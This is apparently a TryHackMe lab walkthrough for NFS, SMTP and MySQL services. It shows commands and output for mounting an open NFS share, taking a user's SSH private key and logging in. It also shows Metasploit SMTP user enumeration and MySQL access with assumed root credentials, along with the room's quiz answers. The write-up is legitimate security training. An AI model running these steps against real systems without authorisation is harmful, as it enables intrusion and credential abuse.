---
Enumerating and Exploiting More Common Network Services & Misconfigurations
---

# Network Services 2 — Writeup

## Overview
### Network Services 2 — Writeup
### Network Services 2 — Writeup
### Understanding NFS
What is NFS?
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.
![|333](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fconceptdraw.com%2Fa468c4%2Fp26%2Fpreview%2F640%2Fpict--file-share-network---vector-stencils-library.png--diagram-flowchart-example.png&f=1&nofb=1)
How does NFS work?
Computer network - Vector stencils library | Computers ...
We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html
First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.
The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.
If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:
The file handle
The name of the file to be accessed
The user's, user ID
The user's group ID
These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.
What runs NFS?
Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.
A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.
More Information:
Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.
https://www.datto.com/library/what-is-nfs-file-share
http://nfs.sourceforge.net/
https://wiki.archlinux.org/index.php/NFS
What does NFS stand for? *Network File System*
What process allows an NFS client to interact with a remote directory as though it was a physical device? *mounting* (What does your Operating System do to access a physical drive?)
What does NFS use to represent files and directories on the server? *file handle*
What protocol does NFS use to communicate between the server and client? *RPC*
What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2 *user ID / group ID*
Can a Windows NFS server share files with a Linux client? (Y/N) *Y*
Can a Linux NFS server share files with a MacOS client? (Y/N) *Y*
What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research. *4.2*

## Enumeration
Let's Get Started
Before we begin, make sure to deploy the room and give it some time to boot. Please be aware - this can take up to five minutes so be patient!
What is Enumeration?
Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - Infosec Institute. It is a critical phase when considering how to enumerate and exploit a remote machine - as the information you will use to inform your attacks will come from this stage
Requirements
In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: nfs-common.
NFS-Common
It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/xenial/nfs-common.
You can install nfs-common using "sudo apt install nfs-common", it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.
Port Scanning
Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about nmap in more detail please have a look at the nmap room.
The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using nmap with the -A and -p- tags.
Mounting NFS shares
Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:
sudo mount -t nfs IP:share /tmp/mount/ -nolock
Let's break this down
Tag 	Function
sudo 	Run as root
mount 	Execute the mount command
-t nfs 	Type of device to mount, then specifying that it's NFS
IP:share 	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock 	Specifies not to use NLM locking
Now we understand our tools, let's get started!
Conduct a thorough port scan scan of your choosing, how many ports are open? *7*
Which port contains the service we're looking to enumerate? *2049*
```text
showmount -e 10.10.218.128
```
``
`Export list for 10.10.218.128: /home *`
Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share? *home*
Time to mount the share to our local machine!
First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.
```text
mkdir /tmp/mount
```
```text
sudo mount -t nfs 10.10.218.128:home /tmp/mount/ -nolock
```
```text
ls -al /tmp/mount
```
Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside? *cappucino*
```ls -all
cd /tmp/mount/cappucino
```
Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory... *No answer needed*
Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server? *.ssh*
Which of these keys is most useful to us? *id_rsa*
Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
Can we log into the machine using `ssh -i <key-file> <username>@<ip>` ? (Y/N) *Y*
```text
┌──(kali㉿kali)-[~/Downloads/learning_nfs]
└─$ chmod 600 id_rsa
```
Lets Get Started
Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!
Enumerating Server Details
Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "smtp_version" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.
Enumerating Users from SMTP
The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users
We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
Requirements
As we're going to be using Metasploit for this, it's important that you have Metasploit installed. It is by default on both Kali Linux and Parrot OS; however, it's always worth doing a quick update to make sure that you're on the latest version before launching any attacks. You can do this with a simple "sudo apt update", and accompanying upgrade- if any are required.
Alternatives
It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.
This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.
Now we've covered the theory. Let's get going!
First, lets run a port scan against the target machine, same as last time. What port is SMTP running on? *25*
Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this? *msfconsole*
If you would like some more help, or practice using, Metasploit, Darkstar has an amazing room on Metasploit that you can check out here:
https://tryhackme.com/room/rpmetasploit
```metasploit
msfconsole
```
```text
search smtp_version
```
Let's search for the module "smtp_version", what's it's full module name? *auxiliary/scanner/smtp/smtp_version *
Great, now- select the module and list the options. How do we do this?*options*
Have a look through the options, does everything seem correct? What is the option we need to set? *rhosts*
```text
msf6 > use 21
```
```text
msf6 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com
                                       /rapid7/metasploit-framework/wiki/Using-Me
                                       tasploit
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one
                                       per host)
```
```text
msf6 auxiliary(scanner/smtp/smtp_version) > set rhosts 10.10.184.252
rhosts => 10.10.184.252
```
```text
msf6 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.184.252:25      - 10.10.184.252:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.184.252:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Set that to the correct value for your target machine. Then run the exploit. What's the system mail name? *polosmtp.home*
`Postfix is the most commonly used MTA program that can deliver, receive, or route emails`
What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research. *postfix*
```text
msf6 > search smtp_enum

Matching Modules
================
```
```text
#  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum
```
Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
*auxiliary/scanner/smtp/smtp_enum *
```text
msf6 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   RHOSTS                            yes       The target host(s), see https://gi
                                               thub.com/rapid7/metasploit-framewo
                                               rk/wiki/Using-Metasploit
   RPORT      25                     yes       The target port (TCP)
   THREADS    1                      yes       The number of concurrent threads (
                                               max one per host)
   UNIXONLY   true                   yes       Skip Microsoft bannered servers wh
                                               en testing unix users
   USER_FILE  /usr/share/metasploit  yes       The file that contains a list of p
              -framework/data/wordl            robable users accounts.
              ists/unix_users.txt
```
We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from here.
What option do we need to set to the wordlist's path? *USER_FILE*
Once we've set this option, what is the other essential paramater we need to set? *RHOSTS *
Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated! *No answer needed*
```text
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```
```text
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.184.252
RHOSTS => 10.10.184.252
```
```text
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.184.252:25      - 10.10.184.252:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.184.252:25      - 10.10.184.252:25 Users found: administrator
[*] 10.10.184.252:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Okay! Now that's finished, what username is returned? *administrator*
Let's Get Started
Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, as this can take up to five minutes, so be patient!
When you would begin attacking MySQL
MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.
The Scenario
Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the credentials: "root:password" while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.
Requirements
You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using sudo apt install default-mysql-client. Don't worry- this won't install the server package on your system- just the client.
Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.
Alternatives
As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.
Okay, enough talk. Let's get going!
As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using? *3306*
```text
└─$ nmap --script=mysql-enum 10.10.106.201
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:44 EDT
Nmap scan report for 10.10.106.201
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
```
*you found the credentials: "root:password"*
Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.106.201 -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> exit
Bye
```
Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole                       
                                                  

                 _---------.                                                       
             .' #######   ;."                                                      
  .---,.    ;@             @@`;   .---,..                                          
." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                         
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                         
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                         
     "--'.@@@  -.@        @ ,'-   .'--"                                            
          ".@' ; @       @ `.  ;'                                                  
            |@@@@ @@@     @    .                                                   
             ' @@@ @@   @@    ,                                                    
              `.@@@@    @@   .                                                     
                ',@@     @   ;           _____________                             
                 (   3 C    )     /|___ / Metasploit! \                            
                 ;@'. __*__,."    \|--- \_____________/                            
                  '(.,...."/                                                       

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules
```
```text
msf6 > search mysql_sql

Matching Modules
================
```
```text
#  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql
```
```text
msf6 > use 0
```
```text
msf6 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), see https://github.c
                                         om/rapid7/metasploit-framework/wiki/Usin
                                         g-Metasploit
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as
```
We're going to be using the "mysql_sql" module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order). *PASSWORD/RHOSTS/USERNAME*
```text
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
PASSWORD => password
```
```text
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.106.201
RHOSTS => 10.10.106.201
```
```text
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
```
```text
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.106.201

[*] 10.10.106.201:3306 - Sending statement: 'select version()'...
[*] 10.10.106.201:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```
Run the exploit. By default it will test with the "select version()" command, what result does this give you? *5.7.29-0ubuntu0.18.04.1*
```text
msf6 auxiliary(admin/mysql/mysql_sql) > set sql show databases
sql => show databases
```
```text
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.106.201

[*] 10.10.106.201:3306 - Sending statement: 'show databases'...
[*] 10.10.106.201:3306 -  | information_schema |
[*] 10.10.106.201:3306 -  | mysql |
[*] 10.10.106.201:3306 -  | performance_schema |
[*] 10.10.106.201:3306 -  | sys |
[*] Auxiliary module execution completed
```
Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned? *4*

## Exploitation
```text
┌──(kali㉿kali)-[~/Downloads/learning_nfs]
└─$ ssh -i id_rsa cappucino@10.10.218.128
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 19 18:34:15 UTC 2022

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.218.128
  Swap usage:   0%

44 packages can be updated.
0 updates are security updates.

Last login: Thu Jun  4 14:37:50 2020
cappucino@polonfs:~$
